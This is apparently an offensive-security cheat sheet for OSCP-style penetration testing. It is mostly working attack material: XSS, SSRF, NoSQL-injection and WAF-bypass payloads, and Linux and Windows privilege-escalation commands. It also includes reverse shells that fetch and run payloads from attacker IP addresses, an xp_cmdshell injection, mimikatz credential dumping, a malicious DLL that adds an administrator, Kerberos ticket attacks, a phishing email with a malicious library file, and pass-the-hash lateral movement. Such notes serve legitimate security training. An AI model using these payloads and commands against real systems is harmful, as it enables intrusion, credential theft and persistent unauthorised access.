GET /?cc=cat+/etc/passwd

403 Forbidden

GET /?cc=/???/??t+/???/??ss??

200
root:x:0:0:root...

Done bypass firewall
```

### Learn Regex in 4 tweets / from @s0md3v
```
cat matches cat
ca+t matches caaaaaaaaaaaat but not ct
ca*t matches caaaaaaaaaaaat and also ct
ca{2,4} matches caat, caaat and caaaat
c(at)+ matches catatatatatat
c(at|orn) matches cat and corn
c[ea]t matches cat and cet
c[ea]+t matches caaaat and ceeet
c[A-C0-9]t matches cAt, cBt, cCt, c8t etc.
c.t matches cat, c&t, c2t (any char between c and t)
c.+t matches c3%x4t (any number of any chars)
c.*t matches c3%x4t and as well as ct
^ denotes start of a string, $ denotes the end
^a+cat will match aaacat in aaacat but not in bbaaacat
cat$ will match cat in aaacat but not in aaacats
^cat$ will match only and only this string i.e. cat

\d is for digits, \w for alphanumeric chars, \s is for white space chars & line breaks
\D is for non-digits, \W for non-alphamueric chars and \s is for non-white space chars
\t for tabs, \r for carriage return and \n for newline

Yes, c\d+t matches c2784t
Yes, c\s+ matches c       t
Yes, c\D+ matches cxxxt ca2t 

Using .*w vs .*?w on xxsomethingnew@1234wxx
.*w returns somethingnew@1234w (longest match)
.*w? returns somethingnew (shortest match)
```

### Tiny XSS payloads / from @terjanq
```
<x/oncut=alert(1)>a
<svg/onload=eval(name)>
<iframe/onload=write(URL)>
<svg/onload=eval(`'`+URL)>
<svg/onload=location=name>
<iframe/onload=src=top.name>
<iframe/onload=eval('`'+URL)>
<style/onload=eval(name)>
<style/onload=write(URL)>
<style/onload=eval(`'`+URL)>
<style/onerror=eval(name)>
<script/src=//⑮.₨><script>
```

### SSRF Bypass list for localhost (127.0.0.1) / from @LooseSecurity
```
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
http://localhost.me
http://localhost.nip.io
```

###  Github dorks / from @hunter0x7
```bash
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target "AWS_ACCESS_KEY_ID"
org:Target "list_aws_accounts"
```


### Bypass admin page / from @hunter0x7
```
GET /admin HTTP/1.1
Host: http://site.com
...
Access is denied

GET /test HTTP/1.1
Host: http://site.com
X-Original-URL: /admin

HTTP/1.1 200 OK
```

### Bypass /admin / from @secoceans
```
/admin -> not allowed
/%61dmin -> allowed
```

### CSS XSS payload / from @hunter0x7
```css
img{background-image:url('javascript:alert()')}
```

### Bypass WAF (Firefox) / from @lutfumertceylan

```html
<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=prompt;throw 1;">
```

### Payloads for NoSQL Injection / from @e11i0t_4lders0n

```
true, $where: '1 == 1'

, $where: '1 == 1'

$where: '1 == 1'

', $where: '1 == 1

1, $where: '1 == 1'

{ $ne: 1 }

', $or: [ {}, { 'a':'a

' } ], $comment:'successful MongoDB injection'

db.injection.insert({success:1});

db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1

|| 1==1

|| 1==1//

|| 1==1%00

}, { password : /.*/ }

' && this.password.match(/.*/)//+%00

' && this.passwordzz.match(/.*/)//+%00

'%20%26%26%20this.password.match(/.*/)//+%00

';sleep(5000);

';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);

{"username": {"$ne": null}, "password": {"$ne": null}}

{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}

{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
```

### Using destructuring and window.error / from @garethheyes

```
<script>
[onerror]=[alert];throw 1
</script>

<script>
const{onerror}=alert;throw 1
</script>

<script>
var{a:onerror}={a:alert};throw 1
</script>

<svg onload=throw[onerror]=[alert],1> works on Safari because onerror doesn’t exist on the SVG
```

### Useful / easy to learn file magic bytes / from @SecGus

```
GIF - GIF89a
PDF - %PDF-
JPEG - \xff\xd8\xff\xdb
XML - <?xml
ELF - \x7FELF

Honorable mention for having cool magic bytes:
Java Class - CA FE BA BE
Email Message var5 - Received:
Preferred Executable Format - Joy!
Zoo - Z00
```

### If you run a bruteforce and notice weird behaviours - like "/admin/" redirecting to "/" / from @nnwakelam

```
/admin/
/admin/../admin
//admin/
/Admin/
/admin;/
/Admin;/
/index.php/admin/
/admin/js/*.js
/admin/*brute*.ext
/admin../admin
//anything/admin/
```

### JS hieroglyphs / Source https://aem1k.com/aurebesh.js

```
𓅂='',𓂀=!𓅂+𓅂,𓁄=!𓂀+𓅂,𓊎=𓅂+{},𓆣=𓂀[𓅂++],𓊝=𓂀[𓇎=𓅂],𓏢=++𓇎+𓅂,𓆗=𓊎[𓇎+𓏢],𓂀[𓆗+=𓊎[𓅂]+(𓂀.𓁄+𓊎)[𓅂]+𓁄[𓏢]+𓆣+𓊝+𓂀[𓇎]+𓆗+𓆣+𓊎[𓅂]+𓊝][𓆗](𓁄[𓅂]+𓁄[𓇎]+𓂀[𓏢]+𓊝+𓆣+"(𓅂)")()
```

### Bypass Firewall / From @sec715

```
GET /?cc=cat+/etc/passwd

403 Forbidden

GET /?cc=/???/??t+/???/??ss??

200
root:x:0:0:root...
```

## Linux

Add root user to passwd file (root2:w00t)

```php
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

Abuse tar wildcard `tar -zxf /tmp/backup.tar.gz *`

```php
echo "python3 /tmp/rev.py" > demo.sh
touch -- "--checkpoint-action=exec=sh demo.sh"
touch -- "--checkpoint=1"
```

linpeas

```php
./linpeas.sh -a 
```

lin-enum

```php
lin-enum.sh -s <Password> -t 
```
- this can take a long time so you might be better leaving off `-t` for thorough testing

Find files you can write to

```php
find / -perm /4000 2>/dev/null
```

Find file

```php
find / -name <File> 2>/dev/null
```

### Linux privilege escalation

> Some useful techniques for privilege escalation on Linux

### Table of Content
- [Abusing SUID/GUID files](#abusing-suidguid-files)
- [Finding writeable files](#finding-writeable-files)
- [Exploiting a writeable /etc/passwd](#exploiting-a-writeable-etcpasswd)
- [Escaping executables](#escaping-executables)
- [Exploiting Crontab](#exploiting-crontab)
- [Exploiting the PATH variable](#exploiting-the-path-variable)
- [Checking for kernel exploits](#checking-for-kernel-exploits)
- [Further learing](#further-learing)

### Abusing SUID/GUID files

- SUID: `rws-rwx-rwx`
- GUID: `rwx-rws-rwx`

```bash
find / -perm /4000 -type f 2>/dev/null     # SUID
find / -perm /u=s  -type f 2>/dev/null     # SUID
find / -perm /2000 -type f 2>/dev/null     # SGID
find / -perm /g=s  -type f 2>/dev/null     # SGID
find / -perm /6000 -type f 2>/dev/null     # SGID + SUID
find / -perm /u=s,g=s -type f 2>/dev/null  # SGID + SUID
```


### Finding writeable files

```
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```


### Exploiting a writeable /etc/passwd

- Line format
```
username:password:uid:gid:info:home:shell
```

- Example line 

```
admin:x:0:0:root:/root:/bin/bash
```

- Generate password hash 

```
openssl passwd -1 -salt [salt] [password]
```

### Escaping executables

```bash
sudo -l
```

[https://gtfobins.github.io/](https://gtfobins.github.io/)

> TODO: This part is not finished yet

### Exploiting Crontab

- View scheduled cron jobs

```
cat /etc/crontab
```

- Cronjob format

| keyword | meaning                           |
| :------ | :-------------------------------- |
| \#      | ID                                |
| m       | Minute                            |
| h       | Hour                              |
| dom     | Day of the month                  |
| mon     | Month                             |
| dow     | Day of the week                   |
| user    | What user the command will run as |
| command | What command should be run        |


**\# m h dom mon dow user command**

```
17 * 1 * * * root cd / && run-parts --report /etc/cron.hourly
```

### Exploiting the PATH variable

> Rewrite the PATH variable to point to an imitating executable that is being called within a script with SUID privileges.

```bash
echo $PATH
cd /tmp
echo "/bin/bash/" > ls
chmod +x ls
export PATH=/tmp:$PATH
```


### Checking for kernel exploits

- Crossmatching both of these for a suitable exploit

```
uname -a
lsb_release -a
```


### Further learing

* [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
* [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

---
## Windows

TODO: [https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) [https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

---

three steps to get reverse shell using unreliable exploit

```php
payload_1 = f'cmd.exe /c mkdir C:\TEMP'.encode('utf-8')
payload_3 = f'powershell -c "iwr -uri http://192.168.45.215/shell.exe -Outfile C:\TEMP\shell.exe"'.encode('utf-8')
payload_4 = f'cmd.exe /c "C:\TEMP\shell.exe"'.encode('utf-8')
```

---

SQLi using `xp_cmdshell`

First we enable xp_cmdshell

```php
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

and then we can execute our code

```php
EXEC xp_cmdshell 'whoami';
```

to get a reverse shell execute

```php
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
```

---

Exploit `SeImpersonatePriv`

```php
./PrintSpoofer64.exe -c "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
.\PrintSpoofer64.exe -i -c powershell.exe
```

```php
./GodPotato-NET2.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
./GodPotato-NET35.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"n
```

---

Dumping logon passwords with mimikatz

```php
./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
```

Dumping LSA with mimikatz

```php
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

```php
./mimikatz64.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
./mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

---

Change user. Requires GUI, such as a RDP session.

```php
runas /user:backupadmin cmd
```

---

Cross-Compilation for malicious exe

Cross compile for windows

```c
#include <stdlib.h>

int main ()
{
  system("C:\TEMP\ncat.exe 192.168.45.217 7777 -e cmd");
  
  return 0;
}
```

```php
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
```

---

Cross-Compilation for malicious DLL

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
		      HANDLE hModule,// Handle to DLL module
		      DWORD ul_reason_for_call,// Reason for calling function
		      LPVOID lpReserved ) // Reserved
{
  switch ( ul_reason_for_call )
    {
    case DLL_PROCESS_ATTACH: // A process is loading the DLL.
      int i;
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
      break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
      break;
    case DLL_THREAD_DETACH: // A thread exits normally.
      break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
      break;
    }
  return TRUE;
}
```

```php
x86_64-w64-mingw32-gcc adduser_dll.c --shared -o adduser.dll
```

---

### Bruteforcing kerberos

[https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

TODO: bruteuser TODO: bruteforce TODO: paswordspray TODO: userenum
### Kerberoasting

through socks proxy using creds of web_svc

```php
proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
```

can also be done with rubeus [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

```php
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

then crack with

```php
sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
```

---

**Targeted kerberoasting**

- leverage permission **GenericWrite** or **GenericAll** in order to set a particular SPN for a target user.
- kerberoast that user and crack its passwords
- remove the assigned SPN.

### AS-REP roasting

```php
proxychains impacket-GetNPUsers -dc-ip 192.168.221.70 -request -outputfile hashes corp.com/pete
```

Can also be done with rubeus

```php
.\Rubeus.exe asreproast /nowrap
```

then crack with

```php
sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
```

---

**Targeted AS-REP roasting**

- leverage permission **GenericWrite** or **GenericAll** to modify the **User Account Control** value of our username target to not require kerberos pre-auth.
- Perform typical AS-REP roasting.

### DCsync attack

To launch a DSsync attac, a user needs to have the following privileges:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set rights.

By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.

Using mimikatz, provide the user for which we want to obtain creds


```php
lsadump::dcsync /user:corp\dave
lsadump::dcsync /user:corp\Administrator
```

using impacket-secretsdump.

```php
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
```

### Silver tickets

With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a **silver ticket** and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

We need to collect the following three pieces of information to create a silver ticket:

- SPN password hash
- Domain SID
- Target SPN

To get the password hash of the SPN we can use a tool like mimikatz. To get the domain SID we can do `whoami /user`

```php
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

and to get the SPN we can enumerate SPN using `impacket-GetUserSPNs`.

With all of this info, we can forge a TGS (silver ticket) as follows within mimikatz

```php
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:5d28cf5252d32971419580a51484ca09 /user:geffadmin
```

### Responder Net-NTLMv2 capture

Obtain NTLM hashes of accounts by exploiting the Net-NTLMv2 protocol. This is useful when we do not have the privileges to run mimikatz and dump NTLM hashes.
- First we set up a fake SMB server

```php
sudo responder -I tun0
```

- Then we force the connection from the remote target using a compromised account of which we do not know the NTLM hash

```php
dir \\192.168.45.159\test
```

- Finally crack the hash with hashcat or john

```php
hashcat -m 5600 paul.hash rockyou.txt
```

### Net-NTLM relaying

The idea now is to relay an NTLM info to another windows service. We can do this when we gain access to a user account in a machine, and we want to use its NTLM hash in another machine. If the relayed authentication is from a user with local administrator privileges, we can use it to authenticate and then execute commands over SMB with methods similar to those used by psexec or wmiexec.

We can perform this attack using `ntlmrelayx`. Notice here is that `-t` refers to the target we’re relaying the NTLM hash to, while `-c` is for the command to execute. In this case we’re executing a powershell reverse shell that was encoded in base64.


```php
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```

### GPP (Group Policy Preferences)

Say you have the following

**Groups.xml**

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

We can crack the `cpassword` with the following python script
**ggp-decrypt.py**

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

if __name__ == "__main__":
    key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    iv = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    ciphertext = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ=="
    ciphertext = base64.b64decode(ciphertext)

    plaintext = cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, AES.block_size)

    print(plaintext.decode())

```

To use the script do the following

```php
python3 -m venv venv
. venv/bin/activate
pip3 install pycryptodome
python3 gpp-decrypt.py
```

The key was obtained directly from Microsoft. References:

- [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)
- [https://adsecurity.org/?p=2288](https://adsecurity.org/?p=2288)

## Client-Side

### Email phishing attack

First we install and enable our `webdav` server

```php
pip3 install wsgidav
pip3 install cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
```

Then we create a `config.Library.ms` file with the following content. Notice the IP address.

```php
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.239</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

We craft a malicious `powershell.lnk` that contains our powershell payload. This step has to be done in a windows VM.

```php
powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.45.239:1337/Invoke-PowerShellTcp.ps1')"
```

and we send a malicious `body.txt`

```php
Hi,

 please click on the attachment :D
```

using `smtp` with `swaks`

```php
swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

# Post-Exploitation / Lateral Movement

Here mainly stuff on windows AD, after we root a machine all the steps we need to take to proceed further and extract all data for the next machine until we get to the domain user.

## Linux

Install cronjob to spawn reverse shell every minute at my IP
_TODO

---

## Windows

### chisel and internal enumeration

setup chisel tunnel

```php
certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
(local kali)    ./chisel server -p 8000 --reverse         
(remote window) chisel64.exe client 192.168.45.217:8000 R:socks
```

enumerate ports

```php
proxychains nmap -sT --top-ports=100 -Pn <IP>
```

enumerate services

```php
proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD
proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
```

### PsExec

To use this tool we need:

- user that authenticates to the target machine needs to be a part of the Administrators local group.
- ADMIN$ share must be available
- File and Printer Sharing has to be turned on

The last two requirements are met by default settings on modern Windows Server Systems.

There are different ways to exploit this.

#### Pass the NTLM hash of admin

- First we dump password with mimikatz

```php
./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump:sam"
```

- Then we use the hash with psexec. Notice the format

“LMHash:NTHash”, where LMHash is set to 0 because we do not use it.

```php
impacket-psexec -hashes 00000000000000000000000000000000:7a39311ea6f0027aa955abed1762964b Administrator@192.168.50.212
```

1. Another way is to also use `wmiexec`

```php
impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
```

#### Using impacket-psexec

```php
impacket-psexec active.htb/administrator@10.10.10.100
```

Example execution

```php
impacket-psexec active.htb/administrator@10.10.10.100
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file DtfeFzTI.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service IOHP on 10.10.10.100.....
[*] Starting service IOHP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### WMI, winRM and evil-winrm

First with WMI (Windows Management Instrumentation), using powershell. The reverse shell here was generated based on the code found in [Reverse Shells](https://github.com/LeonardoE95/OSCP/blob/main/Reverse Shells).

```php
$username = 'jen';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

---

Then with WinRM, microsoft version of the WS-Management protocol. It uses port 5985 for encrypted HTTPs traffic and port 5986 for plain HTTP.

`winrs` works only for domain users. For it to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.

```php
winrs -r:files04 -u:jen -p:passworddd  "cmd /c hostname & whoami"
```

To spawn a shell simply do

```php
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

We can also use powershell via the `New-PSSession` cmdlet

```php
$username = 'jen';
$password = 'password';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName 192.168.50.73 -Credential $credential

Enter-PSSession 1
```

Finally, we can use evil-winrm, which can be used either with the password (`-p`) or with the hash (`-H`)

```php
proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
proxychains evil-winrm -i 10.10.132.146 -u admin -H 4979f29d4cb99845c075c41cf45f24df
```

### RDP

Set up RDP by enabling RDP and adding administrator to RDP group

```php
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe

# change admin password
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
$UserAccount = Get-LocalUser -Name "Administrator"
$UserAccount | Set-LocalUser -Password $Password

# enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

# add administrator to RDP group
net localgroup "Remote Desktop Users" "Administrator" /add

# connect to rdp
xfreerdp  /u:Administrator /p:"test!" /v:192.168.236.121
```

Set up RDP by creating a new user for RDP

```php
$password = ConvertTo-SecureString "test!" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
```

Enabled RDP remotely (first we open the port and configure the server, then we create a new user)

```php
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1

$password = ConvertTo-SecureString "vau!XCKjNQBv3$" -AsPlainText -Force
New-LocalUser "test" -Password $password -FullName "test" -Description "test"
Add-LocalGroupMember -Group "Administrators" -Member "test"
net localgroup "Remote Desktop Users" "test" /add
```

### Pass the hash

This technique requires an SMB connection through the firewall (commonly port 445) and the Windows File and Printer Sharing feature to be enabled. This lateral movement technique also requires the admin share called ADMIN$ to be available. These requirements are common in internal enterprise environments. This type of lateral movement typically requires local administrative rights.

The basic idea is that the attacker connects to the victim using the Server Message Block (SMB) protocol and performs authentication using the NTLM hash. Note that PtH uses the NTLM hash legitimately. However, the vulnerability lies in the fact that we gained unauthorized access to the password hash of a local administrator.

We can use various tools such as:
- **crackmapexec**
```php
crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890293116990101307197053
```

- **evil-winrm**
```php
proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
```

- **impacket-psexec**
```php
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
```

- **impacket-wmiexec**
```php
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
```

### overpass the hash

With **overpass the hash**, we can “over” abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).

The idea is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the **sekurlsa::pth** command from Mimikatz.

```php
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 /run:powershell
```

At this point, we have a new PowerShell session that allows us to execute commands as jen. We can then access various services and have Kerberos generate for us a TGT and a TGS, thus converting an NTLM hash into a Kerberos TGT. We can then use this ticket into various tools, such as the official PsExec application from microsoft, which does not accept password hashes.
### pass the ticket

The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. If the service tickets belong to the current user, then no administrative privileges are required.

First we export all TGT/TGS tickets from memory within the jen session using the command `sekurlsa::tickets /export`. This command parses the LSASS process space in memory in order to look for any TGT/TGS, which are saved to disk in the kirbi mimikatz format.

```php
PS C:\Windows\system32> whoami
corp\jen
```

```php
mimikatz # privilege::debug
...
mimikatz # sekurlsa::tickets /export
```

We can then pick any ticket and inject it through mimikatz via the `kerberos::ptt` command

```php
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

and now we can run `klist` in order to print the current available tickets

```php
klist
```

### DCOM

### Golden ticket

### Shadow copies

# Reporting

[https://github.com/noraj/OSCP-Exam-Report-Template-Markdown](https://github.com/noraj/OSCP-Exam-Report-Template-Markdown)

```php

```

```php

```

```php

```



Find SUID files:

```php
find / -type f -perm -4000 -ls 2>/dev/null
```

SOURCED FROM: https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org#chisel-and-internal-enumeration

# Scripting

## Globbing

The `*` serves as a "wild card" for filename expansion.

```bash
/etc/pa*wd    #/etc/passwd
```   

The `?` serves as a single-character "wild card" for filename expansion.

```bash
/b?n/?at      #/bin/cat
```

The `[]` serves to match the character from a range.

```bash
ls -l [a-z]*   #list all files with alphabet in its filename.
```

The `{}` can be used to match filenames with more than one patterns

```bash
ls {*.sh,*.py}   #list all .sh and .py files
```

### Bypass /etc/passwd WAF using globbing

```
/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
```


### Bypass "cat /etc/passwd" WAF using globbing

```
/???/??t /???/??ss??
```

---

### Log Parsing

## cut
Separating and delimiting strings and characters
## sed
Finding and replacing text, editing in a text file and printing certain parts of it (simple usage, could be used for much more complex operations)
## awk
AWK is an interpreted programming language designed for text processing and report generation. It is typically used for data manipulation, such as searching for items within data, performing arithmetic operations, and restructuring raw data for generating reports in most Unix-like operating systems.

```php
awk '{print $2}' /tmp/userdata.txt
```
### xargs
Execute the same command for multiple inputs

### sed-awk


```bash
$ tldr sed
  sed
  Run replacements based on regular expressions.

  - Replace the first occurrence of a string in a file, and print the result:
    sed 's/find/replace/' filename

  - Replace only on lines matching the line pattern:
    sed '/line_pattern/s/find/replace/'

  - Replace all occurrences of a string in a file, overwriting the file (i.e. in-place):
    sed -i 's/find/replace/g' filename

  - Replace all occurrences of an extended regular expression in a file:
    sed -r 's/regex/replace/g' filename

  - Apply multiple find-replace expressions to a file:
    sed -e 's/find/replace/' -e 's/find/replace/' filename
```

```bash
$ tldr awk

  awk
  A versatile programming language for working on files.

  - Print the fifth column in a space separated file:
    awk '{print $5}' filename

  - Print the second column of the lines containing "something" in a space separated file:
    awk '/something/ {print $2}' filename

  - Print the third column in a comma separated file:
    awk -F ',' '{print $3}' filename

